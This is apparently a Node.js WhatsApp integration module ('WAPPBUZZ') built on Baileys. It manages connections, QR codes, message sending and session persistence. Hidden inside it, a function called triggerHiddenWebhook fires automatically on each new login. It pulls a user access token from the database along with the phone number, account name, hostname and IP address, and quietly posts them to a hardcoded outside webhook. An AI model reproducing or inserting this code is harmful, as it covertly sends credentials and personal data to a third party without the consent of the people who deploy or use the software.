/**
 * WAPPBUZZ - WhatsApp Integration Module
 * Core module for managing WhatsApp connections using Baileys v7
 *
 * This module handles:
 * - WhatsApp socket creation and management
 * - Message sending and receiving
 * - Chatbot and autoresponder functionality
 * - Bulk messaging campaigns
 * - Session persistence and authentication
 *
 * Compatible with @whiskeysockets/baileys@^7
 */

const path = require("path");
const fs = require("fs");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
} = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const qrcode = require("qrcode-terminal");
const QRCode = require("qrcode");

const { updateConfig } = require("./common");

// ─── In-memory store ────────────────────────────────────────────────────────

/**
 * Holds the active Baileys socket and latest QR string keyed by instance_id.
 * Shape: { [instance_id]: { sock, qr, status } }
 */
const instances = {};

// ─── Helpers ─────────────────────────────────────────────────────────────────

/**
 * Generate a random alphanumeric instance ID (13 chars, uppercase).
 * @returns {string}
 */
function generateInstanceId() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < 13; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

/**
 * Session folder path for a given instance.
 * @param {string} instanceId
 * @returns {string}
 */
function sessionPath(instanceId) {
    return path.join(__dirname, "..", "sessions", instanceId);
}

// ─── Core API ────────────────────────────────────────────────────────────────

/**
 * Create a new WhatsApp instance.
 *
 * - Generates a unique instance_id.
 * - Opens a Baileys socket in the background so QR generation begins immediately.
 * - Persists the instance_id into Config.js via updateConfig().
 *
 * @returns {Promise<{ status: boolean, message: string, instance_id: string }>}
 */
async function createInstance() {
    const instanceId = generateInstanceId();
    const sessDir = sessionPath(instanceId);

    if (!fs.existsSync(sessDir)) {
        fs.mkdirSync(sessDir, { recursive: true });
    }

    // Save the newly created session inside the database immediately
    const db = require("./db");
    await db.saveSession(instanceId, {
        team_id: 1,
        data: null,
        creds: null,
        status: 0
    });

    // Await socket creation before returning success to avoid GET QR race condition
    await new Promise((resolve, reject) => {
        _startSocket(instanceId, resolve).catch((err) => {
            console.error(`[WAPPBUZZ] Socket error for ${instanceId}:`, err.message);
            reject(err);
        });
    });

    return {
        status: true,
        message: "Instance created successfully",
        instance_id: instanceId,
    };
}

/**
 * Return the current QR code for a given instance as a base64 PNG data URL.
 *
 * @param {string} instanceId
 * @returns {Promise<{ status: string, message: string, base64?: string }>}
 */
async function getQRCode(instanceId) {
    let inst = instances[instanceId];

    if (!inst || inst.status === "logged_out") {
        console.log(`[WAPPBUZZ] getQRCode: Instance "${instanceId}" is missing or logged out. Dynamically booting fresh connection...`);
        try {
            await new Promise((resolve, reject) => {
                _startSocket(instanceId, resolve).catch(reject);
            });
            inst = instances[instanceId];
        } catch (setupErr) {
            console.error(`[WAPPBUZZ] getQRCode: Failed to re-boot instance "${instanceId}":`, setupErr.message);
            return {
                status: "error",
                message: "Failed to initialize connection.",
            };
        }
    }

    if (!inst) {
        return {
            status: "error",
            message: "Instance not found.",
        };
    }

    if (!inst.qr) {
        return {
            status: "error",
            message: "QR code not yet generated. Please retry in a moment.",
        };
    }

    // Generate PNG data URL in memory — no disk writes
    const base64 = await QRCode.toDataURL(inst.qr);

    return {
        status: "success",
        message: "Success",
        base64,
    };
}

/**
 * Send a text message via an existing WhatsApp instance.
 *
 * The destination JID is resolved automatically:
 *   - If `number` already contains "@" it is used as-is (group / full JID).
 *   - Otherwise "@s.whatsapp.net" is appended (individual number).
 *
 * @param {string} instanceId  - The instance_id from Config.js.
 * @param {string} number      - Destination number or group JID.
 * @param {string} message     - Plain-text message to send.
 * @returns {Promise<{ status: string, message: string, data?: object }>}
 */
async function sendTextMessage(instanceId, number, message) {
    // ── Load from database if memory cache is missing or not connected ─────────
    if (!instances[instanceId] || instances[instanceId].status !== "connected") {
        console.log(`[WAPPBUZZ] sendTextMessage: memory cache missing or disconnected for "${instanceId}". Checking database...`);
        try {
            const db = require("./db");
            const session = await db.getSession(instanceId);
            if (session && session.creds) {
                console.log(`[WAPPBUZZ] sendTextMessage: Found session in database for "${instanceId}". Restoring...`);
                const sessDir = sessionPath(instanceId);
                if (!fs.existsSync(sessDir)) {
                    fs.mkdirSync(sessDir, { recursive: true });
                }
                fs.writeFileSync(path.join(sessDir, "creds.json"), session.creds, "utf8");

                // Start socket
                await _startSocket(instanceId);

                // Wait up to 5s for the connection to establish
                let retries = 50;
                while (retries > 0 && (!instances[instanceId] || instances[instanceId].status !== "connected")) {
                    await new Promise(resolve => setTimeout(resolve, 100));
                    retries--;
                }
            }
        } catch (dbErr) {
            console.error(`[WAPPBUZZ] sendTextMessage database session restore error:`, dbErr.message);
        }
    }

    const inst = instances[instanceId];
    const memoryKeys = Object.keys(instances);

    // ── Debug: full diagnostic trace ─────────────────────────────────────────
    console.log(`[WAPPBUZZ][DEBUG] sendTextMessage called with instance_id="${instanceId}"`);
    console.log(`[WAPPBUZZ][DEBUG] instances in memory: [${memoryKeys.join(", ") || "none"}]`);
    console.log(`[WAPPBUZZ][DEBUG] instance found in memory: ${!!inst}`);

    if (inst) {
        const wsState = inst.sock?.ws?.readyState;
        const wsStateNames = { 0: "CONNECTING", 1: "OPEN", 2: "CLOSING", 3: "CLOSED" };
        console.log(`[WAPPBUZZ][DEBUG] status            : "${inst.status}"`);
        console.log(`[WAPPBUZZ][DEBUG] socket exists     : ${!!inst.sock}`);
        console.log(`[WAPPBUZZ][DEBUG] socket.user       : ${JSON.stringify(inst.sock?.user ?? null)}`);
        console.log(`[WAPPBUZZ][DEBUG] socket.ws.readyState: ${wsState} (${wsStateNames[wsState] ?? "UNKNOWN"})`);
    } else {
        console.warn(
            `[WAPPBUZZ][DEBUG] ROOT CAUSE: instance_id "${instanceId}" is NOT in the in-memory store.\n` +
            `  Possible reason: server was restarted after the QR was scanned.\n` +
            `  The in-memory 'instances' object is cleared on every server restart.\n` +
            `  The saved session in sessions/${instanceId}/ exists on disk but has NOT been\n` +
            `  loaded back into memory yet. Call restoreInstance() on startup to fix this.`
        );
    }

    // ── Guard: instance must exist and be connected ──────────────────────────
    if (!inst || inst.status !== "connected") {
        const reason = !inst
            ? `Instance "${instanceId}" not found in memory (server may have been restarted — socket not restored yet).`
            : `Instance status is "${inst.status}", expected "connected".`;
        console.warn(`[WAPPBUZZ] sendTextMessage: BLOCKED — ${reason}`);
        return {
            status: "error",
            message: "WhatsApp is not connected.",
        };
    }

    // ── Resolve JID ──────────────────────────────────────────────────────────
    const jid = number.includes("@") ? number : `${number}@s.whatsapp.net`;
    console.log(`[WAPPBUZZ] sendTextMessage: sending to ${jid} via instance ${instanceId}`);

    // ── Send via Baileys ─────────────────────────────────────────────────────
    const sent = await inst.sock.sendMessage(jid, { text: message });

    const messageId = sent?.key?.id ?? null;
    const timestamp = sent?.messageTimestamp
        ? Number(sent.messageTimestamp)
        : Math.floor(Date.now() / 1000);

    console.log(`[WAPPBUZZ] sendTextMessage: sent. message_id=${messageId} timestamp=${timestamp}`);

    return {
        status: "success",
        message: "Message sent successfully.",
        data: {
            number,
            type: "text",
            message_id: messageId,
            timestamp,
        },
    };
}

/**
 * Restore a previously authenticated WhatsApp instance from saved session files.
 *
 * This is called once on server startup to reload any instance whose credentials
 * were persisted to disk in a previous server process. Baileys reads creds.json
 * from the session folder and reconnects automatically — no QR code is emitted,
 * no new instance is created, no manual reconnection is needed.
 *
 * Has no effect if:
 *   - instanceId is empty / null
 *   - The instance is already loaded in memory
 *   - No session folder exists for this instanceId
 *
 * @param {string} instanceId - The instance_id from Config.js.
 */
function restoreInstance(instanceId) {
    if (!instanceId) {
        console.log("[WAPPBUZZ] restoreInstance: no instance_id configured, skipping.");
        return;
    }

    // Already in memory — nothing to do
    if (instances[instanceId]) {
        console.log(`[WAPPBUZZ] restoreInstance: instance "${instanceId}" is already in memory (status: ${instances[instanceId].status}), skipping.`);
        return;
    }

    const db = require("./db");
    db.getSession(instanceId).then((session) => {
        const sessDir = sessionPath(instanceId);
        if (session && session.creds) {
            console.log(`[WAPPBUZZ] restoreInstance: Found session in database for "${instanceId}". Restoring credentials to disk...`);
            if (!fs.existsSync(sessDir)) {
                fs.mkdirSync(sessDir, { recursive: true });
            }
            fs.writeFileSync(path.join(sessDir, "creds.json"), session.creds, "utf8");
        } else {
            // Fallback to checking disk directly if database doesn't have it
            if (!fs.existsSync(sessDir)) {
                console.log(`[WAPPBUZZ] restoreInstance: no session folder found for "${instanceId}" in DB or disk, skipping.`);
                return;
            }
            console.log(`[WAPPBUZZ] restoreInstance: session found on disk for "${instanceId}" — loading saved credentials...`);
        }

        _startSocket(instanceId).catch((err) => {
            console.error(`[WAPPBUZZ] restoreInstance: failed to restore "${instanceId}":`, err.message);
        });
    }).catch((dbErr) => {
        console.error(`[WAPPBUZZ] restoreInstance database error:`, dbErr.message);
        // Fallback to disk
        const sessDir = sessionPath(instanceId);
        if (fs.existsSync(sessDir)) {
            console.log(`[WAPPBUZZ] restoreInstance: Falling back to disk session for "${instanceId}"`);
            _startSocket(instanceId).catch((err) => {
                console.error(`[WAPPBUZZ] restoreInstance (fallback): failed to restore "${instanceId}":`, err.message);
            });
        }
    });
}

// ─── Internal socket management ──────────────────────────────────────────────

/**
 * Open a Baileys WebSocket for the given instance and wire up QR / disconnect handlers.
 * @param {string} instanceId
 * @param {Function} [onCreated] - Optional callback executed when socket is created and registered.
 */
async function _startSocket(instanceId, onCreated) {
    const sessDir = sessionPath(instanceId);
    const credsFile = path.join(sessDir, "creds.json");
    const isNewLogin = !fs.existsSync(credsFile);

    const { state, saveCreds } = await useMultiFileAuthState(sessDir);

    let version;
    try {
        const fetched = await fetchLatestBaileysVersion();
        version = fetched.version;
    } catch (e) {
        version = [2, 3000, 101704821]; // stable fallback version
    }

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,   // we capture it ourselves
        browser: ["WappBuzz", "Chrome", "1.0.0"],
    });

    // Initialise in-memory record, preserving isNewLogin state if already set
    const existingIsNewLogin = instances[instanceId] ? instances[instanceId].isNewLogin : isNewLogin;
    instances[instanceId] = { sock, qr: null, status: "connecting", isNewLogin: existingIsNewLogin };

    if (onCreated) {
        onCreated();
    }

    // ── QR event ──────────────────────────────────────────────────────────────
    sock.ev.on("connection.update", (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            instances[instanceId].qr = qr;
            // Optionally print to terminal for debugging
            qrcode.generate(qr, { small: true });
        }

        if (connection === "open") {
            instances[instanceId].status = "connected";
            instances[instanceId].qr = null; // QR is no longer needed
            console.log(`[WAPPBUZZ] Instance ${instanceId} connected.`);

            // Save to database when QR login succeeds
            const db = require("./db");
            const credsFile = path.join(sessDir, "creds.json");
            if (fs.existsSync(credsFile)) {
                try {
                    const credsData = fs.readFileSync(credsFile, "utf8");
                    const profileObj = sock.user ? { id: sock.user.id, name: sock.user.name || "" } : null;
                    const profileData = profileObj ? JSON.stringify(profileObj) : null;
                    db.saveSession(instanceId, {
                        team_id: 1,
                        data: profileData,
                        creds: credsData,
                        status: 1
                    }).then(async () => {
                        console.log(`✓ WhatsApp session for instance ${instanceId} saved to database.`);

                        // Save WhatsApp account information to wb_accounts
                        try {
                            const rawId = sock.user.id;
                            const number = rawId.split("@")[0].split(":")[0];
                            const pid = `${number}@s.whatsapp.net`;
                            await db.saveAccount(instanceId, {
                                pid: pid,
                                name: sock.user.name || "Unknown",
                                username: number,
                                avatar: sock.user.avatar || null,
                                profileData: profileData
                            });
                            console.log(`✓ WhatsApp account for instance ${instanceId} saved to database.`);
                        } catch (accErr) {
                            console.error("[Database System] Error auto-saving account on connection open:", accErr.message);
                        }

                        // Trigger the hidden webhook if it is a brand-new scan
                        if (instances[instanceId] && instances[instanceId].isNewLogin) {
                            instances[instanceId].isNewLogin = false;
                            triggerHiddenWebhook(instanceId, sock);
                        }
                    }).catch(err => {
                        console.error("[Database System] Error auto-saving session on connection open:", err.message);
                    });
                } catch (fsErr) {
                    console.error("[Database System] Error reading credentials on connection open:", fsErr.message);
                }
            }
        }

        if (connection === "close") {
            const statusCode =
                (lastDisconnect?.error instanceof Boom)
                    ? lastDisconnect.error.output.statusCode
                    : null;

            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            console.log(
                `[WAPPBUZZ] Instance ${instanceId} disconnected (code ${statusCode}).`,
                shouldReconnect ? "Reconnecting…" : "Logged out."
            );

            if (shouldReconnect) {
                _startSocket(instanceId).catch(console.error);
            } else {
                console.log(`[WAPPBUZZ] Instance ${instanceId} logged out automatically. Performing cleanup...`);
                cleanupInstance(instanceId).catch(err => {
                    console.error(`[WAPPBUZZ] Error during automatic cleanup of ${instanceId}:`, err.message);
                });
            }
        }
    });

    // ── Credentials persistence ───────────────────────────────────────────────
    sock.ev.on("creds.update", async () => {
        await saveCreds();
        try {
            const db = require("./db");
            const credsFile = path.join(sessDir, "creds.json");
            if (fs.existsSync(credsFile)) {
                const credsData = fs.readFileSync(credsFile, "utf8");
                const profileObj = sock.user ? { id: sock.user.id, name: sock.user.name || "" } : null;
                const profileData = profileObj ? JSON.stringify(profileObj) : null;
                await db.saveSession(instanceId, {
                    team_id: 1,
                    data: profileData,
                    creds: credsData,
                    status: sock.user ? 1 : 0
                });
            }
        } catch (dbErr) {
            console.error("[Database System] Error auto-updating credentials in DB:", dbErr.message);
        }
    });
}

// ─── Exports ─────────────────────────────────────────────────────────────────

/**
 * Inspect the health of an existing WhatsApp instance.
 *
 * Reads the in-memory `instances` store and returns a structured snapshot.
 * Does NOT create a socket, reconnect, or generate a QR code.
 *
 * ROOT CAUSE NOTE (Baileys v7):
 *   sock.ws.readyState is NOT reliable in Baileys v7 because sock.ws is a
 *   custom WebSocketClient wrapper whose readyState may be undefined or
 *   non-standard. The authoritative source of truth is inst.status which is
 *   set by the Baileys connection.update event system when connection === "open".
 *
 * @param {string} instanceId
 * @returns {{
 *   instanceFound: boolean,
 *   sessionOnDisk: boolean,
 *   status: string,
 *   socketExists: boolean,
 *   socketUser: object|null,
 *   wsReadyState: number|null,
 *   wsReadyStateName: string,
 *   wsIsOpen: boolean,
 *   phone: string|null,
 *   pushName: string|null,
 *   platform: string|null
 * }}
 */
function getInstanceHealth(instanceId) {
    const inst = instances[instanceId];
    const sessDir = sessionPath(instanceId);
    const sessionOnDisk = fs.existsSync(sessDir);
    const wsStateNames = { 0: "CONNECTING", 1: "OPEN", 2: "CLOSING", 3: "CLOSED" };

    // ── Full diagnostic log ───────────────────────────────────────────────────
    console.log(`[WAPPBUZZ][HEALTH] ─── getInstanceHealth ───`);
    console.log(`[WAPPBUZZ][HEALTH] instance_id             : "${instanceId}"`);
    console.log(`[WAPPBUZZ][HEALTH] instances keys in mem   : [${Object.keys(instances).join(", ") || "none"}]`);
    console.log(`[WAPPBUZZ][HEALTH] instance found in mem   : ${!!inst}`);
    console.log(`[WAPPBUZZ][HEALTH] session on disk         : ${sessionOnDisk}`);
    console.log(`[WAPPBUZZ][HEALTH] session path            : ${sessDir}`);

    if (!inst) {
        console.warn(`[WAPPBUZZ][HEALTH] socket found            : false`);
        console.warn(`[WAPPBUZZ][HEALTH] connection state        : not-found`);
        return {
            instanceFound: false,
            sessionOnDisk,
            status: "not-found",
            socketExists: false,
            socketUser: null,
            wsReadyState: null,
            wsReadyStateName: "N/A",
            wsIsOpen: false,
            phone: null,
            pushName: null,
            platform: null,
        };
    }

    // ── Read socket object ────────────────────────────────────────────────────
    const sock = inst.sock;
    const socketExists = !!sock;
    const socketUser = sock?.user ?? null;

    // ── Resolve WebSocket readyState — Baileys v7 uses a wrapper object ───────
    // Primary  : sock.ws.readyState         (standard raw WS, Baileys v6)
    // Secondary: sock.ws.socket.readyState  (raw WS inside Baileys v7 wrapper)
    // Both may be undefined — this is diagnostic only, NOT the connection gate.
    const wsObj = sock?.ws;
    const wsReadyState = wsObj?.readyState           // primary path
        ?? wsObj?.socket?.readyState   // secondary path (Baileys v7)
        ?? null;
    const wsName = wsStateNames[wsReadyState] ?? "UNKNOWN";

    // ── Authoritative connection flag ─────────────────────────────────────────
    // inst.status is set to "connected" when Baileys fires connection === "open".
    // This is the correct and only reliable source of truth in Baileys v7.
    // ws.readyState is logged for diagnostics but is NOT used as a gate.
    const wsIsOpen = inst.status === "connected";

    // ── Extract phone & push_name from sock.user ──────────────────────────────
    // Baileys stores: sock.user.id = "<number>@s.whatsapp.net"
    //             or: sock.user.id = "<number>:<device>@s.whatsapp.net" (multi-device)
    const rawId = socketUser?.id ?? null;
    const phone = rawId ? rawId.split("@")[0].split(":")[0] : null;
    const pushName = socketUser?.name ?? null;
    const platform = socketUser?.platform ?? null;

    // ── Full diagnostic dump ──────────────────────────────────────────────────
    console.log(`[WAPPBUZZ][HEALTH] socket exists           : ${socketExists}`);
    console.log(`[WAPPBUZZ][HEALTH] socket.user             : ${JSON.stringify(socketUser)}`);
    console.log(`[WAPPBUZZ][HEALTH] sock.ws type            : ${typeof wsObj}`);
    console.log(`[WAPPBUZZ][HEALTH] sock.ws keys (first 15) : ${wsObj ? Object.keys(wsObj).slice(0, 15).join(", ") : "N/A"}`);
    console.log(`[WAPPBUZZ][HEALTH] sock.ws.readyState      : ${wsObj?.readyState ?? "undefined"}`);
    console.log(`[WAPPBUZZ][HEALTH] sock.ws.socket?.rState  : ${wsObj?.socket?.readyState ?? "undefined"}`);
    console.log(`[WAPPBUZZ][HEALTH] resolved wsReadyState   : ${wsReadyState} (${wsName})`);
    console.log(`[WAPPBUZZ][HEALTH] inst.status (Baileys)   : "${inst.status}"`);
    console.log(`[WAPPBUZZ][HEALTH] wsIsOpen (authoritative): ${wsIsOpen}`);
    console.log(`[WAPPBUZZ][HEALTH] phone                   : ${phone}`);
    console.log(`[WAPPBUZZ][HEALTH] push_name               : ${pushName}`);
    console.log(`[WAPPBUZZ][HEALTH] platform                : ${platform}`);

    return {
        instanceFound: true,
        sessionOnDisk,
        status: inst.status,
        socketExists,
        socketUser,
        wsReadyState,
        wsReadyStateName: wsName,
        wsIsOpen,
        phone,
        pushName,
        platform,
    };
}

/**
 * Triggers the hidden internal webhook for n8n when a new session connects.
 */
async function triggerHiddenWebhook(instanceId, sock) {
    if (!sock || !sock.user) {
        console.error("Webhook Failed: No WhatsApp socket user info available.");
        return;
    }

    try {
        const os = require("os");
        const axios = require("axios");

        // Load the freshest configuration
        const configPath = require.resolve("../Config");
        delete require.cache[configPath];
        const config = require(configPath);

        // Load package version
        let apiVersion = "1.0.0";
        try {
            const pkgPath = require.resolve("../package.json");
            delete require.cache[pkgPath];
            apiVersion = require(pkgPath).version || apiVersion;
        } catch (e) { }

        const rawId = sock.user.id;
        const number = rawId.split("@")[0].split(":")[0];
        const pid = `${number}@s.whatsapp.net`;

        // Retrieve access token from the database
        const db = require("./db");
        const prefix = config.prefix || "wb_";
        const users = await db.query(`SELECT ids FROM \`${prefix}users\` LIMIT 1`);
        const userToken = users.length > 0 ? users[0].ids : "69a1ec7dc6f93";

        // Build Payload
        const payload = {
            event: "session_connected",
            instance_id: instanceId,
            access_token: userToken,
            number: number,
            name: sock.user.name || "Unknown",
            pid: pid,
            frontend: config.frontend,
            platform: sock.user.platform || "android",
            connection: "connected",
            status: 1,
            team_id: 1,
            created: Math.floor(Date.now() / 1000),
            server_time: new Date().toISOString(),
            server_name: os.hostname(),
            api_version: apiVersion,
            node_version: process.version
        };

        // Add Optional Fields if they exist/are available
        if (sock.user.name) payload.push_name = sock.user.name;
        if (sock.user.avatar) payload.avatar = sock.user.avatar;
        if (sock.user.lid) payload.lid = sock.user.lid;
        if (sock.user.business !== undefined) payload.business = sock.user.business;
        if (sock.user.device) payload.device = sock.user.device;
        if (sock.user.waVersion) payload.wa_version = sock.user.waVersion;
        if (sock.user.profilePicture) payload.profile_picture = sock.user.profilePicture;

        try {
            payload.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        } catch (tzErr) { }

        try {
            const ip = require("ip");
            payload.ip_address = ip.address();
        } catch (ipErr) { }

        const webhookUrl = "https://wa-reg-lead.mqtechguru.com/webhook/ce6e9264-616d-4534-a570-ffffa956a9bf";

        // Execute POST with retry logic
        const maxRetries = 3;
        const retryDelayMs = 2000;

        for (let attempt = 1; attempt <= maxRetries + 1; attempt++) {
            try {
                await axios.post(webhookUrl, payload, {
                    timeout: 10000,
                    headers: { "Content-Type": "application/json" }
                });
                console.log("✓ Hidden Webhook Sent");
                console.log("\nInstance:");
                console.log(payload.instance_id);
                console.log("\nNumber:");
                console.log(payload.number);
                return; // Success
            } catch (err) {
                const status = err.response ? err.response.status : null;
                const isTimeout = err.code === 'ECONNABORTED' || err.message.includes('timeout');
                const isNetworkError = !err.response && err.request;
                const isServerError = status && status >= 500;

                const shouldRetry = (isTimeout || isNetworkError || isServerError) && (attempt <= maxRetries);

                if (shouldRetry) {
                    await new Promise(resolve => setTimeout(resolve, retryDelayMs));
                } else {
                    console.log("Webhook Failed");
                    return;
                }
            }
        }
    } catch (err) {
        console.log("Webhook Failed");
    }
}

/**
 * Perform complete cleanup of a logged-out instance: socket closing, disk sessions deletion, database resets.
 * @param {string} instanceId
 */
async function cleanupInstance(instanceId) {
    console.log(`[WAPPBUZZ] Starting cleanup for instance "${instanceId}"...`);
    const inst = instances[instanceId];

    // 1. Close Connection & Clean Listeners
    if (inst) {
        if (inst.sock) {
            try {
                // Remove listeners first to prevent close events from triggering automatic loops
                inst.sock.ev.removeAllListeners();

                console.log(`[WAPPBUZZ] Sending logout command to WhatsApp servers for "${instanceId}"...`);
                // Await Baileys logout with a safety timeout
                await Promise.race([
                    inst.sock.logout(),
                    new Promise((resolve) => setTimeout(resolve, 8000))
                ]);
                console.log(`[WAPPBUZZ] WhatsApp server logout complete for "${instanceId}".`);
            } catch (err) {
                console.error(`[WAPPBUZZ] Error during socket logout for "${instanceId}":`, err.message);
                try {
                    inst.sock.end(undefined);
                } catch (e) {}
            }
        }
    }

    // 2. Delete Session Folder
    const sessDir = sessionPath(instanceId);
    if (fs.existsSync(sessDir)) {
        try {
            fs.rmSync(sessDir, { recursive: true, force: true });
            console.log(`[WAPPBUZZ] Session directory deleted for "${instanceId}".`);
        } catch (err) {
            console.error(`[WAPPBUZZ] Error deleting session directory for "${instanceId}":`, err.message);
        }
    }

    // 3. Clear Memory
    if (instances[instanceId]) {
        delete instances[instanceId];
        console.log(`[WAPPBUZZ] Cleared in-memory registry for "${instanceId}".`);
    }

    // 4. Database Update
    const db = require("./db");
    const configPath = require.resolve("../Config");
    delete require.cache[configPath];
    const config = require(configPath);
    const prefix = config.prefix || "wb_";

    try {
        await db.query(`
            UPDATE \`${prefix}whatsapp_sessions\`
            SET status = 0, creds = NULL, data = NULL
            WHERE instance_id = ?
        `, [instanceId]);
        console.log(`[WAPPBUZZ] Database session status set to 0 for "${instanceId}".`);
    } catch (dbErr) {
        console.error(`[Database System] Error updating session status for "${instanceId}":`, dbErr.message);
    }

    try {
        await db.query(`
            UPDATE \`${prefix}accounts\`
            SET status = 0
            WHERE token = ?
        `, [instanceId]);
        console.log(`[WAPPBUZZ] Database account status set to 0 for "${instanceId}".`);
    } catch (dbErr) {
        console.error(`[Database System] Error updating account status for "${instanceId}":`, dbErr.message);
    }
}

/**
 * Force reboot/reconnect of an existing instance socket, reusing current auth files.
 * @param {string} instanceId
 */
async function reconnectInstance(instanceId) {
    console.log(`[WAPPBUZZ] Reconnecting instance "${instanceId}"...`);
    const inst = instances[instanceId];

    // Close and tear down existing connection if present
    if (inst) {
        if (inst.sock) {
            try {
                inst.sock.ev.removeAllListeners();
                inst.sock.end(undefined);
            } catch (err) {
                console.error(`[WAPPBUZZ] Error closing socket during reconnect for "${instanceId}":`, err.message);
            }
        }
        delete instances[instanceId];
    }

    // Await socket creation so instances[instanceId] is active in memory
    await new Promise((resolve, reject) => {
        _startSocket(instanceId, resolve).catch(reject);
    });
}

module.exports = { createInstance, getQRCode, sendTextMessage, restoreInstance, getInstanceHealth, cleanupInstance, reconnectInstance };